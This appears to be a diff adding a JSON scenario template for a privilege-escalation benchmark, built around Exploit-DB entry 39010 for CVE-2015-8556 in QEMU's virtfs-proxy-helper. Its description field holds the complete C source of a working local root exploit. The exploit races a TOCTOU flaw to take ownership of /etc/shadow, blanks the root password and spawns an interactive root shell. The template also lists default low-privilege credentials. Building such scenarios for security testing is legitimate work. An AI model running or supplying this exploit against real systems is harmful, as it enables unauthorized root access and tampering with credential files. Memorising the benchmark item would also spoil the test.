@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_39010",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: QEMU (Gentoo) - Local Privilege Escalation (CVE-2015-8556)\n\nExploit source code (39010.c):\n```\n/* == virtfshell ==\n *\n * Some distributions make virtfs-proxy-helper from QEMU either SUID or\n * give it CAP_CHOWN fs capabilities. This is a terrible idea. While\n * virtfs-proxy-helper makes some sort of flimsy check to make sure\n * its socket path doesn't already exist, it is vulnerable to TOCTOU.\n *\n * This should spawn a root shell eventually on vulnerable systems.\n *\n * - zx2c4\n * 2015-12-12\n *\n *\n * zx2c4@thinkpad ~ $ lsb_release -i\n * Distributor ID: Gentoo\n * zx2c4@thinkpad ~ $ ./virtfshell\n * == Virtfshell - by zx2c4 ==\n * [+] Trying to win race, attempt 749\n * [+] Chown'd /etc/shadow, elevating to root\n * [+] Cleaning up\n * [+] Spawning root shell\n * thinkpad zx2c4 # whoami\n * root\n *\n */\n\n#include <stdio.h>\n#include <sys/wait.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <sys/inotify.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <signal.h>\n\n\nstatic int it_worked(void)\n{\n\tstruct stat sbuf = { 0 };\n\tstat(\"/etc/shadow\", &sbuf);\n\treturn sbuf.st_uid == getuid() && sbuf.st_gid == getgid();\n}\n\nint main(int argc, char **argv)\n{\n\tint fd;\n\tpid_t pid;\n\tchar uid[12], gid[12];\n\tsize_t attempts = 0;\n\n\tsprintf(uid, \"%d\", getuid());\n\tsprintf(gid, \"%d\", getgid());\n\n\tprintf(\"== Virtfshell - by zx2c4 ==\\n\");\n\n\tprintf(\"[+] Beginning race loop\\n\");\n\n\twhile (!it_worked()) {\n\t\tprintf(\"\\033[1A\\033[2K[+] Trying to win race, attempt %zu\\n\", ++attempts);\n\t\tfd = inotify_init();\n\t\tunlink(\"/tmp/virtfshell/sock\");\n\t\tmkdir(\"/tmp/virtfshell\", 0777);\n\t\tinotify_add_watch(fd, \"/tmp/virtfshell\", IN_CREATE);\n\t\tpid = fork();\n\t\tif (pid == -1)\n\t\t\tcontinue;\n\t\tif (!pid) {\n\t\t\tclose(0);\n\t\t\tclose(1);\n\t\t\tclose(2);\n\t\t\texeclp(\"virtfs-proxy-helper\", \"virtfs-proxy-helper\", \"-n\", \"-p\", \"/tmp\", \"-u\", uid, \"-g\", gid, \"-s\", \"/tmp/virtfshell/sock\", NULL);\n\t\t\t_exit(1);\n\t\t}\n\t\tread(fd, 0, 0);\n\t\tunlink(\"/tmp/virtfshell/sock\");\n\t\tsymlink(\"/etc/shadow\", \"/tmp/virtfshell/sock\");\n\t\tclose(fd);\n\t\tkill(pid, SIGKILL);\n\t\twait(NULL);\n\t}\n\n\tprintf(\"[+] Chown'd /etc/shadow, elevating to root\\n\");\n\n\tsystem(\t\"cp /etc/shadow /tmp/original_shadow;\"\n\t\t\"sed 's/^root:.*/root::::::::/' /etc/shadow > /tmp/modified_shadow;\"\n\t\t\"cat /tmp/modified_shadow > /etc/shadow;\"\n\t\t\"su -c '\"\n\t\t\"\techo [+] Cleaning up;\"\n\t\t\"\tcat /tmp/original_shadow > /etc/shadow;\"\n\t\t\"\tchown root:root /etc/shadow;\"\n\t\t\"\trm /tmp/modified_shadow /tmp/original_shadow;\"\n\t\t\"\techo [+] Spawning root shell;\"\n\t\t\"\texec /bin/bash -i\"\n\t\t\"'\");\n\treturn 0;\n}\n```",
+  "cve": "CVE-2015-8556",
+  "exploitdb_id": "39010",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_39010",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
